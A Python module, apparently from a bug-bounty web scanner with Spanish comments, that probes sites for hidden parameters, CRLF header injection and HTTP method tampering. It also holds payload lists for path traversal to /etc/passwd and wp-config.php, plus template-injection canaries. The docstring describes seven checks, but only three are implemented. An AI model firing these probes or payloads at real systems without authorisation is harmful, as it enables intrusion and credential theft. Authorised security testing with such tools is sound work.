"""STEALTH-BAIT: caza de superficie oculta para blancos blindados.

Los escaneres genericos prueban siempre lo mismo en los mismos sitios. Esta
bateria ataca por donde nadie mira, 100% MODO LECTURA (canarios inertes,
cero payloads de explotacion, estandar A->B):

  1. HIDDEN-PARAMS  parametros secretos que el frontend nunca muestra
                   (debug, is_admin, role, internal...): si el backend
                   reacciona a uno, hay logica no publicada a revisar.
  2. PATH-BAIT     path traversal en params file/path/tpl/lang con firma
                   de deteccion (passwd / wp-config). LFI PAGA en la tabla
                   de Patchstack.
  3. SSTI-BAIT     canario de plantilla {{7*7}} / ${7*7} / #{7*7}: si la
                   respuesta contiene 49, el servidor COMPUTA (RCE paga).
  4. CRLF-BAIT     inyeccion de cabeceras: marcador %0d%0a en params
                   reflejados, verificado SOLO en headers de respuesta.
  5. METHOD-BAIT   method tampering: X-HTTP-Method-Override, _method, y
                   verbos alternativos sobre endpoints de datos.
  6. CACHE-BAIT    deteccion PASIVA de entradas unkeyed (X-Forwarded-Host
                   reflejado): candidata a cache poisoning, sin envenenar.
  7. GRAPHQL       introspeccion abierta y endpoints /graphql ocultos.

Todo con presupuesto de sondas por objetivo (respeta el CEREBRO) y
anti-FP por comparacion contra baseline.
"""

import json
import re
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

HIDDEN_PARAMS = [
    "debug", "is_admin", "isadmin", "admin", "role", "internal", "test",
    "dev", "trace", "verbose", "full", "all", "hidden", "show", "preview",
    "staff", "sudo", "privileged", "bypass", "override", "manage",
]

TRAVERSAL_NAMES = re.compile(
    r"(file|path|page|template|tpl|lang|dir|view|include|load|download|"
    r"doc|docpath|filepath|source|resource)", re.I)

TRAV_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "php://filter/convert.base64-encode/resource=wp-config.php",
]
TRAV_SIGNATURES = [
    (r"root:[x*!]:0:0:", "passwd"),
    (r"DB_PASSWORD", "wp-config"),
]

SSTI_CANARIES = ["{{7*7}}", "${{7*7}}", "#{7*7}", "${7*7}", "<%= 7*7 %>",
                 "{{ 7 * 7 }}", "{7*7}", "#set($x=7*7)$x"]

METHOD_OVERRIDES = [{"header": "X-HTTP-Method-Override", "value": "PUT"},
                    {"header": "X-Method-Override", "value": "PATCH"},
                    {"param": "_method", "value": "PUT"},
                    {"param": "_method", "value": "delete"}]

GRAPHQL_PATHS = ["/graphql", "/api/graphql", "/v1/graphql", "/graphiql",
                 "/api/graphql/v1", "/query"]

UNKEYED_HEADERS = ["X-Forwarded-Host", "X-Forwarded-Scheme",
                   "X-Original-URL", "X-Override-URL", "X-Forwarded-Server",
                   "X-Host"]


def _set_qs(url: str, extra: Dict[str, str]) -> str:
    p = urlparse(url)
    qs = dict(parse_qsl(p.query))
    qs.update(extra)
    return urlunparse(p._replace(query=urlencode(qs)))


def _norm_len_delta(base_len: int, new_len: int) -> float:
    if base_len == 0:
        return 0.0
    return abs(new_len - base_len) / base_len


class StealthBait:
    def __init__(self, session, emit, delay: float = 0.0):
        self.session = session
        self.emit = emit or (lambda m: None)
        self.delay = delay

    # ---------------------------------------------------------- base

    def _get(self, url: str, headers: Optional[Dict[str, str]] = None):
        try:
            return self.session.get(url, timeout=12, headers=headers or {})
        except Exception:
            return None

    def _baseline(self, url: str):
        r = self._get(url)
        if r is None:
            return None
        return {"status": r.status_code, "len": len(r.text or ""),
                "body": (r.text or "")[:4000], "headers": dict(r.headers)}

    # ------------------------------------------------- 1 hidden params

    def hidden_params(self, url: str) -> List[Dict[str, Any]]:
        base = self._baseline(url)
        if base is None:
            return []
        out: List[Dict[str, Any]] = []
        for p in HIDDEN_PARAMS:
            r = self._get(_set_qs(url, {p: "1"}))
            if r is None:
                continue
            delta = _norm_len_delta(base["len"], len(r.text or ""))
            reacted = (r.status_code != base["status"]) or delta > 0.25 \
                or (p in (r.text or "").lower() and p not in base["body"].lower())
            if reacted:
                out.append({
                    "type": "Parametro oculto", "severity": "media",
                    "target": _set_qs(url, {p: "1"}), "param": p,
                    "evidence": f"{p}=1 cambia la respuesta "
                                f"(status {base['status']}->{r.status_code}, "
                                f"tamaño {base['len']}->{len(r.text or '')})",
                    "verdict": "candidato: logica no publicada reacciona",
                })
                self.emit(f"[stealth] 🧐 el parametro oculto '{p}' hace reaccionar "
                          f"al backend en {urlparse(url).path}")
        return out

    # --------------------------------------------------------- crlf


    def crlf(self, target: Dict[str, Any]) -> List[Dict[str, Any]]:
        param, url = target["param"], target["url"]
        marker = "cw-crlf-probe"
        # CRLF crudo: urlencode lo codifica UNA sola vez a %0D%0A
        probe = _set_qs(url, {param: "x\r\nX-Cw-Hunter: " + marker})
        r = self._get(probe)
        if r is None:
            return []
        hdrs = {k.lower(): v.lower() for k, v in r.headers.items()}
        if marker in json.dumps(hdrs):
            return [{
                "type": "CRLF (inyeccion de cabeceras)", "severity": "alta",
                "target": probe, "param": param,
                "evidence": "el marcador %0d%0a aparecio como CABECERA de "
                            "respuesta: el servidor parte cabeceras",
                "verdict": "confirmado en headers de respuesta",
            }]
        return []

    # ------------------------------------------------ method tamper

    def method_tamper(self, url: str) -> List[Dict[str, Any]]:
        base = self._baseline(url)
        if base is None:
            return []
        out: List[Dict[str, Any]] = []
        for ov in METHOD_OVERRIDES:
            headers = {ov["header"]: ov["value"]} if "header" in ov else {}
            u = _set_qs(url, {ov["param"]: ov["value"]}) if "param" in ov else url
            r = self._get(u, headers=headers)
            if r is None:
                continue
            if r.status_code not in (base["status"], 405, 501) and \
                    _norm_len_delta(base["len"], len(r.text or "")) > 0.4:
                out.append({
                    "type": "Method tampering", "severity": "media",
                    "target": u if "param" in ov else url,
                    "param": ov.get("header") or ov.get("param", "-"),
                    "evidence": f"{ov.get('header') or ov['param']}="
                                f"{ov['value']} altera el comportamiento "
                                f"(status {base['status']}->{r.status_code})",
                    "verdict": "candidato: metodo alternativo aceptado",
                })
                self.emit(f"[stealth] 🧐 method tampering reacciona en "
                          f"{urlparse(url).path}")
        return out

    def run(self, url: str, spider_out: Dict[str, Any]) -> List[Dict[str, Any]]:
        self.emit("[stealth] === STEALTH-BAIT: params ocultos + CRLF + method ===")
        findings: List[Dict[str, Any]] = []
        targets = [t for t in spider_out.get("param_targets", [])
                   if t.get("score", 0) >= 4][:10]
        for t in targets:
            findings += self.hidden_params(t["url"])
            findings += self.crlf(t)
        if self._get(url) is not None:
            findings += self.method_tamper(url)
        n = len(findings)
        self.emit(f"[stealth] === STEALTH-BAIT: {n} hallazgo(s) ===")
        return findings
